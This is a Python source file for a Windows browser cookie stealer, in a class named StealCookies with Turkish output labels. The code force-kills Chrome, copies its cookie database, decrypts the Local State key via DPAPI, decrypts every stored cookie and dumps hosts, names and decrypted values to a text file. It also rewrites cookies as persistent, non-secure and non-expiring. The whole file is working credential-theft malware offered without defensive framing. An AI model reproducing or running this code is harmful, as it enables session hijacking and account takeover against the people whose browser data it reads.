import json, base64, subprocess, os, shutil, sqlite3, psutil, win32crypt, time
from datetime import datetime, timedelta
from Crypto.Cipher import AES

class StealCookies:
    @staticmethod
    def get_chrome_datetime(chromedate):
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    @staticmethod
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    @staticmethod
    def decrypt_data(data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""

    @staticmethod
    def main():
        if StealCookies.is_chrome_running():
            print("Chrome kapatılıyor...")
            time.sleep(5)
            try:
                subprocess.call("TASKKILL /F /IM chrome.exe", shell=True)
            except Exception as e:
                pass

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
                               "User Data", "Default", "Network", "Cookies")

        filename = "Cookies.db"
        if not os.path.isfile(filename):
            shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)

        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")

        key = StealCookies().get_encryption_key()

        with open("cookies.txt", "w") as cookies_file:
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = StealCookies().decrypt_data(encrypted_value, key)
                else:
                    decrypted_value = value
                cookies_file.write(f"""
                Host: {host_key}
                Çerez adı: {name}
                Çerez değeri (şifrelenmiş): {decrypted_value}
                Oluşturma tarihi (UTC): {StealCookies().get_chrome_datetime(creation_utc)}
                Son erişim tarihi (UTC): {StealCookies().get_chrome_datetime(last_access_utc)}
                Bitiş tarihi (UTC): {StealCookies().get_chrome_datetime(expires_utc)}
                ===============================================================\n""")
                cursor.execute("""
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                WHERE host_key = ?
                AND name = ?""", (decrypted_value, host_key, name))
        db.commit()
        db.close()

        os.remove("Cookies.db")

    @staticmethod
    def is_chrome_running():
        for proc in psutil.process_iter(['name']):
            if 'chrome' in proc.info['name'].lower():
                return True
        return False